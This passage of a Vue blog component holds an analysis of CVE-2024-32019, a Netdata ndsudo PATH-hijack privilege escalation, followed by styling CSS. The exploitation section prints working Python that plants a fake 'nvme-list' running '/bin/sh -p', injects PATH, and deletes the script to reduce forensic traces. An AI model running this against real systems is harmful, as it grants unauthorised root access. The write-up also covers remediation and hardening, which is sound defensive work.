    tags: ['CVE-2024-32019', 'Privilege Escalation', 'Netdata', 'SUID', 'Linux', 'CWE-426'],
    content: [
      {
        type: 'callout', variant: 'info',
        text: 'CVE-2024-32019 · CVSS 8.8 (HIGH) · CWE-426 Untrusted Search Path · Netdata Agent < 1.45.3 · Published: April 2024'
      },
      {
        type: 'h2', text: '1. Overview'
      },
      {
        type: 'p',
        text: 'CVE-2024-32019 is a high-severity local privilege escalation (LPE) vulnerability affecting Netdata Agent versions prior to <code>1.45.3</code>. The flaw resides in <code>ndsudo</code>, a SUID root-owned binary bundled with the Netdata monitoring agent. The vulnerability arises from the failure to sanitize or reset the <code>PATH</code> environment variable before resolving command names, a classic manifestation of CWE-426 (Untrusted Search Path). A local attacker with low privileges can exploit this behaviour to execute arbitrary code with root permissions, achieving full system compromise.'
      },
      {
        type: 'github',
        user: 'julichaan',
        repo: 'CVE-2024-32019-ndsudo-local-privilege-escalation-NetData',
        description: 'Proof-of-concept exploit for CVE-2024-32019 — local privilege escalation via SUID ndsudo binary in Netdata Agent < 1.45.3.',
        language: 'Python',
        url: 'https://github.com/julichaan/CVE-2024-32019-ndsudo-local-privilege-escalation-NetData'
      },
      {
        type: 'h2', text: '2. Technical Background: ndsudo and the SUID Mechanism'
      },
      {
        type: 'p',
        text: '<code>ndsudo</code> is an internal helper binary within the Netdata Agent designed to allow the unprivileged Netdata daemon to execute a restricted set of system commands with elevated privileges. It is owned by <code>root</code> and has the <strong>SUID bit</strong> (Set User ID on execution) set.'
      },
      {
        type: 'p',
        text: 'The SUID permission flag instructs the Linux kernel to execute a binary with the effective UID of the file\'s owner rather than the UID of the invoking user. For root-owned SUID binaries, this means any system user can trigger execution context with <code>euid=0</code>. This mechanism is used legitimately by utilities such as <code>passwd</code>, <code>ping</code>, and <code>sudo</code>, all of which are specifically hardened against environment-based attacks. <code>ndsudo</code> was not.'
      },
      {
        type: 'table',
        headers: ['Binary', 'Owner', 'SUID', 'PATH Sanitisation'],
        rows: [
          ['sudo', 'root', 'Yes', 'Yes — resets to safe defaults'],
          ['passwd', 'root', 'Yes', 'Not applicable'],
          ['ndsudo (< 1.45.3)', 'root', 'Yes', 'No — inherits caller\'s PATH'],
        ]
      },
      {
        type: 'h2', text: '3. Root Cause Analysis: CWE-426 Untrusted Search Path'
      },
      {
        type: 'p',
        text: 'When <code>ndsudo</code> is invoked with a whitelisted command name (e.g. <code>nvme-list</code>, <code>ip</code>, <code>node</code>), it resolves the absolute path of that command by searching through the directories enumerated in the <code>PATH</code> environment variable. Because <code>PATH</code> is inherited directly from the calling user\'s environment and is never validated, filtered, or overridden prior to resolution, the attacker retains full control over the search order.'
      },
      {
        type: 'p',
        text: 'The Linux dynamic linker and shell command resolution proceed left-to-right through <code>PATH</code>. By prepending an attacker-controlled directory — such as the current working directory — any command name can be shadowed. When <code>ndsudo</code> subsequently attempts to locate the whitelisted binary, the operating system finds the malicious impersonator first and executes it under root privileges.'
      },
      {
        type: 'callout', variant: 'warn',
        text: 'The vulnerability is not in the whitelist mechanism itself, but in the implicit trust placed on the caller-supplied environment during path resolution. The whitelist only validates the command name, not the resolved absolute path.'
      },
      {
        type: 'h2', text: '4. Exploitation'
      },
      {
        type: 'p',
        text: 'The exploit (<code>poc.py</code>) implements the attack in four sequential phases. Each phase is examined below with direct reference to the source code.'
      },
      {
        type: 'h3', text: 'Phase 1 — Binary Discovery'
      },
      {
        type: 'p',
        text: 'The exploit begins by locating the <code>ndsudo</code> binary on the target system. Three common installation paths are enumerated, covering the majority of Netdata deployment configurations across different Linux distributions and package managers.'
      },
      {
        type: 'code',
        text:
`NDSUDO_PATHS = [
    "/usr/libexec/netdata/plugins.d/ndsudo",
    "/usr/lib/netdata/plugins.d/ndsudo",
    "/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo"
]

def find_ndsudo():
    for path in NDSUDO_PATHS:
        if os.path.exists(path) and os.access(path, os.X_OK):
            return path`
      },
      {
        type: 'p',
        text: 'The check <code>os.access(path, os.X_OK)</code> ensures the binary is not only present but executable by the current user — a prerequisite for invocation. As a fallback, the function also queries <code>which ndsudo</code> to handle non-standard installations.'
      },
      {
        type: 'h3', text: 'Phase 2 — Payload Construction'
      },
      {
        type: 'p',
        text: 'A shell script impersonating the target whitelisted command (defaulting to <code>nvme-list</code>) is written to the current working directory and marked executable.'
      },
      {
        type: 'code',
        text:
`TARGET_CMD = "nvme-list"

payload_content = """#!/bin/sh
/bin/sh -p
"""

with open(TARGET_CMD, "w") as f:
    f.write(payload_content)

os.chmod(TARGET_CMD, st.st_mode | stat.S_IEXEC)`
      },
      {
        type: 'p',
        text: 'The <code>-p</code> flag passed to <code>/bin/sh</code> is of critical importance. Without it, modern shells (bash, dash) detect a discrepancy between the real UID and effective UID — a consequence of the SUID mechanism — and voluntarily drop privileges as a defensive measure. The <code>-p</code> flag (privileged mode) suppresses this behaviour, preserving the root effective UID throughout the shell session.'
      },
      {
        type: 'h3', text: 'Phase 3 — PATH Injection'
      },
      {
        type: 'p',
        text: 'The attacker\'s current working directory is prepended to the <code>PATH</code> variable in a copy of the current process environment. This modified environment is then passed to the <code>ndsudo</code> invocation.'
      },
      {
        type: 'code',
        text:
`cwd = os.getcwd()
new_env = os.environ.copy()
original_path = new_env.get("PATH", "")
new_env["PATH"] = f"{cwd}:{original_path}"`
      },
      {
        type: 'p',
        text: 'The use of <code>os.environ.copy()</code> rather than replacing the environment entirely is deliberate: it ensures all other required environment variables remain intact, avoiding execution errors that might arise from a stripped environment, while only modifying the <code>PATH</code> entry.'
      },
      {
        type: 'h3', text: 'Phase 4 — Execution and Cleanup'
      },
      {
        type: 'code',
        text:
`subprocess.run([ndsudo_path, TARGET_CMD], env=new_env)

if os.path.exists(TARGET_CMD):
    os.remove(TARGET_CMD)`
      },
      {
        type: 'p',
        text: '<code>ndsudo</code> is invoked with the tampered environment. The kernel executes it with <code>euid=0</code>. When <code>ndsudo</code> resolves <code>nvme-list</code>, it traverses the injected <code>PATH</code>, locates the malicious script in the current directory first, and executes it — spawning an interactive root shell. Upon return, the malicious binary is deleted from disk, reducing forensic artifacts.'
      },
      {
        type: 'h2', text: '5. CVSS 3.1 Vector Breakdown'
      },
      {
        type: 'p',
        text: 'The assigned vector is <code>AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</code>, yielding a base score of <strong>8.8 (HIGH)</strong>.'
      },
      {
        type: 'table',
        headers: ['Metric', 'Value', 'Rationale'],
        rows: [
          ['Attack Vector', 'Local (L)', 'Requires an existing shell on the target system'],
          ['Attack Complexity', 'Low (L)', 'No race conditions or special configuration required'],
          ['Privileges Required', 'Low (L)', 'Any unprivileged local account suffices'],
          ['User Interaction', 'None (N)', 'No action from another user is required'],
          ['Scope', 'Changed (C)', 'Execution context escalates beyond the original security domain'],
          ['Confidentiality', 'High (H)', 'Full read access to all system data'],
          ['Integrity', 'High (H)', 'Unrestricted write access to all system data'],
          ['Availability', 'High (H)', 'Complete control over system resources and processes'],
        ]
      },
      {
        type: 'h2', text: '6. Affected Versions and Remediation'
      },
      {
        type: 'ul',
        items: [
          '<strong>Affected:</strong> Netdata Agent &lt; 1.45.3 and &lt; 1.45.2-169',
          '<strong>Patched:</strong> Netdata Agent ≥ 1.45.3',
          '<strong>Workarounds:</strong> None — upgrade is the only remediation path',
        ]
      },
      {
        type: 'p',
        text: 'The remediation introduced by the Netdata team involves explicitly resetting the <code>PATH</code> environment variable to a safe, known-good value within <code>ndsudo</code> prior to any command resolution. This eliminates the attacker\'s ability to influence the search path regardless of what the calling process supplies.'
      },
      {
        type: 'callout', variant: 'info',
        text: 'General guidance for hardening SUID binaries: always reset PATH and other security-sensitive environment variables (IFS, LD_PRELOAD, LD_LIBRARY_PATH) to safe defaults at the earliest possible point in execution.'
      },
      {
        type: 'h2', text: '7. Disclosure Timeline'
      },
      {
        type: 'table',
        headers: ['Date', 'Event'],
        rows: [
          ['April 12, 2024', 'CVE-2024-32019 first reported / published'],
          ['April 2024', 'Netdata Agent 1.45.3 released with patch'],
          ['November 21, 2024', 'Last NVD modification entry'],
        ]
      },
      {
        type: 'h2', text: '8. Conclusion'
      },
      {
        type: 'p',
        text: 'CVE-2024-32019 is a textbook instance of CWE-426 applied to a privileged binary. The vulnerability requires no exploitation of memory corruption, no kernel bugs, and no complex preconditions — only a local shell and a writable directory. The low attack complexity combined with a changed scope and complete CIA impact justifies the HIGH severity rating. This case reinforces a fundamental principle of secure systems programming: any binary that executes with elevated privileges must treat all caller-supplied input — including environment variables — as untrusted and potentially hostile.'
      },
    ]
  }
])
</script>

<style scoped>
/* ── Base ────────────────────────────────────────── */
.blog-root {
  min-height: 100vh;
  background: #000;
  font-family: 'JetBrains Mono', monospace;
  color: #ccc;
  padding: 3rem 2rem;
}

/* ── Grid View ───────────────────────────────────── */
.grid-view { max-width: 1200px; margin: 0 auto; }

.blog-header { text-align: center; margin-bottom: 4rem; }
.section-pre   { font-size: .7rem; letter-spacing: .2em; color: #ff003c44; margin: 0 0 .6rem; }
.section-title { font-size: 2.6rem; font-weight: 900; letter-spacing: .3em; color: #ff003c; margin: 0 0 1rem; }
.section-sub   { font-size: .82rem; color: #444; max-width: 520px; margin: 0 auto; line-height: 1.8; }

.posts-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
  gap: 1.5rem;
}

.post-card {
  background: #080808;
  border: 1px solid #ffffff0a;
  border-radius: 3px;
  padding: 1.8rem;
  cursor: pointer;
  transition: border-color .2s, background .2s, transform .15s;
  display: flex;
  flex-direction: column;
  gap: 1rem;
}
.post-card:hover {
  border-color: #38bdf833;
  background: #0a0d10;
  transform: translateY(-2px);
}

.card-top { display: flex; gap: .75rem; align-items: center; }
.card-category {
  font-size: .65rem; letter-spacing: .15em; text-transform: uppercase;
  color: #ff003c; border: 1px solid #ff003c44; padding: 3px 8px; border-radius: 2px;
}
.card-cvss {
  font-size: .65rem; letter-spacing: .12em;
  color: #f59e0b; border: 1px solid #f59e0b44; padding: 3px 8px; border-radius: 2px;
}

.card-title {
  font-size: 1rem; font-weight: 700; color: #fff;
  line-height: 1.5; margin: 0;
}
.card-excerpt {
  font-size: .78rem; color: #555; line-height: 1.8; margin: 0;
  flex: 1;
}
.card-tags { display: flex; flex-wrap: wrap; gap: 6px; }
.card-tag {
  font-size: .62rem; padding: 3px 8px;
  border: 1px solid #38bdf822; color: #38bdf888; border-radius: 2px;
  letter-spacing: .04em;
}
.card-footer {
  display: flex; justify-content: space-between;
  font-size: .68rem; color: #333; padding-top: .75rem;
  border-top: 1px solid #ffffff08;
}

/* ── Post View ───────────────────────────────────── */
.post-view { max-width: 820px; margin: 0 auto; }

.post-actions {
  display: flex;
  align-items: center;
  gap: .75rem;
  margin-bottom: 2.5rem;
  flex-wrap: wrap;
}

.back-btn {
  font-family: inherit; font-size: .75rem; letter-spacing: .1em;
  color: #38bdf8; background: transparent;
  border: 1px solid #38bdf833; padding: 7px 16px;
  border-radius: 2px; cursor: pointer;
  transition: all .15s;
  text-transform: uppercase;
}
.back-btn:hover { background: #38bdf80d; border-color: #38bdf8; }

.share-btn {
  font-family: inherit; font-size: .75rem; letter-spacing: .1em;
  color: #444; background: transparent;
  border: 1px solid #ffffff12; padding: 7px 16px;
  border-radius: 2px; cursor: pointer;
  transition: all .15s; text-transform: uppercase;
  margin-left: auto;
}
.share-btn:hover { color: #fff; border-color: #ffffff33; }
.share-btn.copied { color: #00ff9f; border-color: #00ff9f33; }

.post-header { margin-bottom: 3rem; }
.post-meta-top { display: flex; gap: .75rem; margin-bottom: 1.25rem; }
.post-title {
  font-size: 1.65rem; font-weight: 900; color: #fff;
  line-height: 1.4; margin: 0 0 1rem;
}
.post-meta {
  display: flex; gap: .75rem; align-items: center;
  font-size: .72rem; color: #444; margin-bottom: 1rem;
}
.meta-sep { color: #333; }
.post-tags { display: flex; flex-wrap: wrap; gap: 6px; }

/* ── Article Body ────────────────────────────────── */
.post-body { display: flex; flex-direction: column; gap: 1.4rem; }

.p-h2 {
  font-size: 1rem; font-weight: 900; color: #ff003c;
  letter-spacing: .15em; text-transform: uppercase;
  border-bottom: 1px solid #ff003c22; padding-bottom: .5rem;
  margin: 1.5rem 0 0; padding-top: 1rem;
}
.p-h3 {
  font-size: .88rem; font-weight: 700; color: #38bdf8;
  letter-spacing: .1em; margin: .5rem 0 0;
}
.p-text {
  font-size: .88rem; color: #888; line-height: 1.95; margin: 0;
}
.p-text code       { color: #38bdf8; background: #38bdf80d; padding: 1px 5px; border-radius: 2px; font-family: inherit; }
.p-text a          { color: #38bdf8; text-decoration: underline; text-underline-offset: 3px; }
.p-text strong     { color: #ccc; font-weight: 700; }

.p-code {
  background: #08090a;
  border: 1px solid #38bdf81a;
  border-left: 3px solid #38bdf8;
  border-radius: 2px;
  padding: 1.25rem 1.5rem;
  font-family: 'JetBrains Mono', monospace;
  font-size: .8rem;
  color: #a5f3fc;
  overflow-x: auto;
  line-height: 1.7;
  margin: 0;
  white-space: pre;
}
.p-code code { font-family: inherit; }

.p-ul {
  padding-left: 1.25rem;
  display: flex; flex-direction: column; gap: .6rem;
  margin: 0;
}
.p-ul li {
  font-size: .88rem; color: #888; line-height: 1.85;
  list-style: none;
}
.p-ul li::before {
  content: '▸ ';
  color: #38bdf8;
  font-size: .75rem;
}
.p-ul li strong { color: #ccc; }

.p-callout {
  padding: 1rem 1.25rem;
  border-radius: 2px;
  font-size: .8rem;
  line-height: 1.8;
}
.p-callout.info {
  background: #38bdf80d; border: 1px solid #38bdf833; color: #38bdf8;
}
.p-callout.warn {
  background: #ff003c0d; border: 1px solid #ff003c44; color: #ff6688;
}

.p-figure {
  margin: 0;
  display: flex;
  flex-direction: column;
  gap: .6rem;
}
.p-img {
  width: 100%;
  border-radius: 2px;
  border: 1px solid #ffffff0a;
  display: block;
}
.p-caption {
  font-size: .72rem;
  color: #444;
  letter-spacing: .04em;
  line-height: 1.6;
}

.p-table-wrap {
  width: 100%;
  border-collapse: collapse;
  font-size: .78rem;
}
.p-table-wrap th {
  text-align: left; padding: .6rem .9rem;
  background: #0a0a0a; color: #38bdf8;
  border: 1px solid #38bdf81a;
  letter-spacing: .08em; font-weight: 700;
}
.p-table-wrap td {
  padding: .6rem .9rem;
  border: 1px solid #ffffff07;
  color: #666; line-height: 1.6;
}
.p-table-wrap tr:nth-child(even) td { background: #0a0a0a; }

/* ── GitHub Card ─────────────────────────────────── */
.gh-card {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 1rem;
  padding: 1.25rem 1.5rem;
  background: #08090a;
  border: 1px solid #ffffff12;
  border-radius: 3px;
  text-decoration: none;
  transition: border-color .2s, background .2s;
}
.gh-card:hover {
  border-color: #38bdf855;
  background: #0a0d10;
}
.gh-card-left { display: flex; flex-direction: column; gap: .7rem; flex: 1; min-width: 0; }
.gh-header { display: flex; align-items: center; gap: .45rem; flex-wrap: wrap; }
.gh-icon { width: 18px; height: 18px; color: #ccc; flex-shrink: 0; }
.gh-user  { font-size: .82rem; color: #666; }
.gh-slash { font-size: .82rem; color: #333; }
.gh-repo  { font-size: .82rem; font-weight: 700; color: #38bdf8; word-break: break-all; }
.gh-desc  { font-size: .78rem; color: #555; line-height: 1.7; margin: 0; }
.gh-footer { display: flex; align-items: center; gap: .9rem; }
.gh-lang {
  display: flex; align-items: center; gap: .4rem;
  font-size: .72rem; color: #666;
}
.gh-lang-dot {
  width: 10px; height: 10px; border-radius: 50%;
  background: #3572A5; flex-shrink: 0;
}
.gh-cve-badge {
  font-size: .65rem; padding: 2px 8px;
  border: 1px solid #ff003c44; color: #ff003c;
  border-radius: 2px; letter-spacing: .08em;
}
.gh-card-right { flex-shrink: 0; }
.gh-arrow {
  font-size: 1.3rem; color: #38bdf844;
  transition: color .2s, transform .15s;
  display: block;
}
.gh-card:hover .gh-arrow { color: #38bdf8; transform: translate(2px, -2px); }

/* ── Responsive ──────────────────────────────────── */
@media (max-width: 768px) {
  .blog-root { padding: 2rem 1rem; }
  .posts-grid { grid-template-columns: 1fr; }
  .post-title { font-size: 1.2rem; }
  .section-title { font-size: 1.8rem; }
}
</style>
